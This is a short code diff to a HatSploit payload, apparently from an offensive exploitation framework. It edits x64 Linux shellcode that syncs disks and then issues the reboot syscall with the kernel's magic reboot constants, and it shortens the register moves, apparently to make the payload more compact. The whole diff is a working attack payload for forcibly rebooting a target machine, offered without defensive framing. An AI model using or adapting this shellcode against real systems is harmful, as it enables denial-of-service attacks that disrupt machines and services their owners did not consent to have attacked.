@@ -29,13 +29,13 @@ class HatSploitPayload(Payload, PayloadTools):
             self.details['Architecture'],
             """
             start:
-                mov rax, 0xa2
+                mov al, 0xa2
                 syscall
 
-                mov rax, 0xa9
-                mov rdx, 0x4321fedc
-                mov rsi, 0x28121969
-                mov rdi, 0xfee1dead
+                mov al, 0xa9
+                mov edx, 0x4321fedc
+                mov esi, 0x28121969
+                mov edi, 0xfee1dead
                 syscall
             """
         )
